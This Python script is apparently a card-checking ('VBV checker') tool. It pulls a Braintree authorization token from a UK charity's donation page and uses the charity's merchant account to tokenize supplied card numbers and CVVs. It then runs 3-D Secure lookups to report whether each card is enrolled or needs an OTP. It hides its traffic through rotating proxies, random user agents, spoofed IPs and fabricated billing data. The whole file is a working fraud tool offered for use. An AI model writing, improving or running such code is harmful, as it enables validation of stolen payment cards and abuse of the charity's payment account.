import requests
import re
import base64
import json
import random
import asyncio
from typing import Optional
from faker import Faker
from user_agent import generate_user_agent
from urllib.parse import quote

def parse_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    clean_proxy = proxy_str.replace("http://", "").replace("https://", "")
    parts = clean_proxy.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2 and parts[1].isdigit():
        return f"http://{clean_proxy}"
    return proxy_str

fake = Faker()

STATUS_MAP = {
    "authenticate_successful": "Passed",
    "authenticate_attempt_successful": "Passed",
    "challenge_required": "OTP Required",
    "authenticate_frictionless_failed": "OTP Required",
    "lookup_card_error": "OTP Required",
    "authenticate_rejected": "OTP Required",
    "lookup_error": "Error",
    "authenticate_unavailable": "OTP Required",
    "authenticate_error": "Error",
    "no_response": "Failed",
}

def detect_brand(cc):
    if cc.startswith("4"): return "VISA"
    if cc.startswith("5"): return "MASTERCARD"
    if cc.startswith("3"): return "AMEX"
    return "DISCOVER"

def extract_auth(session, u):
    headers = {
        "User-Agent": u,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    for attempt in range(5):
        try:
            r = session.get("https://cllsupport.org.uk/donate/", headers=headers, timeout=20)
            if 'clientToken' not in r.text and attempt > 0:
                session.cookies.clear()
                continue
            
            m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
            if not m: m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
            if not m:
                auth_m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', r.text)
                merch_m = re.search(r'"merchantId"\s*:\s*"([^"]+)"', r.text)
                if auth_m:
                    auth = auth_m.group(1)
                    merch = merch_m.group(1) if merch_m else "dyb5fmjx5t5wxckj"
                    return auth, merch
            
            if m:
                decoded = base64.b64decode(m.group(1)).decode("utf-8")
                data = json.loads(decoded)
                auth = data.get("authorizationFingerprint", "")
                merch = data.get("merchantId", "")
                if auth and merch: return auth, merch
        except Exception:
            pass
    return None, None

def tokenize_card(session, auth, cc, month, year, cvv, u):
    year_str = str(year)
    if len(year_str) == 2: year_str = "20" + year_str
    month_str = str(month).zfill(2)
    
    query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
        tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
    }"""
    variables = {"input": {"creditCard": {"number": cc, "expirationMonth": month_str, "expirationYear": year_str, "cvv": str(cvv)}, "options": {"validate": False}}}
    h = {
        "User-Agent": u,
        "Authorization": f"Bearer {auth}", 
        "Braintree-Version": "2018-05-10", 
        "Content-Type": "application/json"
    }
    body = {"clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(fake.uuid4())}, "query": query, "variables": variables, "operationName": "TokenizeCreditCard"}
    try:
        resp = session.post("https://payments.braintree-api.com/graphql", headers=h, json=body, timeout=20)
        data = resp.json()
        if "errors" in data: return None, None, None
        token = data["data"]["tokenizeCreditCard"]["token"]
        cc_info = data["data"]["tokenizeCreditCard"]["creditCard"]
        return token, cc_info.get("last4", ""), cc_info.get("brandCode", "VISA")
    except Exception:
        return None, None, None

def lookup_3ds(session, auth, merch, token, cc_num, u):
    url = f"https://api.braintreegateway.com/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    payload = {
        "amount": "1.00", "browserColorDepth": 24, "browserJavaEnabled": False,
        "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
        "browserScreenHeight": 800, "browserScreenWidth": 360,
        "browserTimeZone": -345, "deviceChannel": "Browser",
        "additionalInfo": {"ipAddress": fake.ipv4(), "billingLine1": "New York", "billingCity": "New York", "billingState": "NY", "billingPostalCode": "10080", "billingCountryCode": "US", "billingPhoneNumber": "998773772", "billingGivenName": "diwas", "billingSurname": "Py", "email": "diwasPy@gmail.com"},
        "bin": cc_num[:6], "dfReferenceId": f"0_{fake.uuid4()}",
        "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.115.1", "cardinalDeviceDataCollectionTimeElapsed": random.randint(400, 2000), "issuerDeviceDataCollectionTimeElapsed": random.randint(800, 5000), "issuerDeviceDataCollectionResult": True},
        "authorizationFingerprint": auth, "braintreeLibraryVersion": "braintree/web/3.115.1",
        "_meta": {"merchantAppId": "cllsupport.org.uk", "platform": "web", "sdkVersion": "3.115.1", "source": "client", "integration": "custom", "integrationType": "custom", "sessionId": str(fake.uuid4())},
    }
    try:
        resp = session.post(url, headers={"User-Agent": u, "Content-Type": "application/json"}, json=payload, timeout=45)
        if resp.status_code in [200, 201] and resp.text.strip(): return resp.json()
    except Exception:
        pass
    return {}

def parse_status(lookup):
    try: return lookup["paymentMethod"]["threeDSecureInfo"]["status"]
    except:
        lookup_str = json.dumps(lookup)
        for code in STATUS_MAP:
            if code in lookup_str: return code
    return "no_response"

def get_enrolled_info(lookup, result_code):
    enrolled_raw = None
    try: enrolled_raw = lookup["paymentMethod"]["threeDSecureInfo"]["enrolled"]
    except: pass
    if enrolled_raw == "Y": return "ENROLLED", "Y"
    elif enrolled_raw == "N": return "NOT_ENROLLED", "N"
    elif enrolled_raw == "U": return "UNKNOWN", "U"
    enrolled_map = {"authenticate_successful": "ENROLLED", "authenticate_attempt_successful": "ENROLLED", "challenge_required": "ENROLLED", "authenticate_frictionless_failed": "ENROLLED", "lookup_card_error": "NOT_ENROLLED", "authenticate_rejected": "NOT_ENROLLED", "lookup_error": "NOT_ENROLLED", "authenticate_unavailable": "NOT_ENROLLED", "authenticate_error": "NOT_ENROLLED", "no_response": "UNKNOWN"}
    return enrolled_map.get(result_code, "UNKNOWN"), enrolled_raw or "-"

def _run_braintree_vbv_sync(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
    u = generate_user_agent()
    session.cookies.set("cookie_test", "please_accept_for_session")
    session.cookies.set("civicAllowCookies", "yes")

    auth, merch = extract_auth(session, u)
    if not auth:
        return False, "Auth failed after 5 retries"
        
    token, last4, brand_code = tokenize_card(session, auth, cc, mes, ano, cvv, u)
    if not token:
        return False, "Tokenization failed"
        
    lookup = lookup_3ds(session, auth, merch, token, cc, u)
    result_code = parse_status(lookup)
    status = STATUS_MAP.get(result_code, "Unknown")
    enrolled_status, enrolled_flag = get_enrolled_info(lookup, result_code)
    
    # If 3DS passed or challenged (OTP required), we consider it successful/valid VBV checks
    success = status in ["Passed", "OTP Required"]
    msg = f"Status: {status} | Enrolled: {enrolled_status} (enrolled={enrolled_flag}) | Code: {result_code} | Card: {brand_code} - {last4}"
    return success, msg

async def process_braintree_vbv(cc: str, mes: str, ano: str, cvv: str, proxy_str: Optional[str] = None):
    return await asyncio.to_thread(_run_braintree_vbv_sync, cc, mes, ano, cvv, proxy_str)
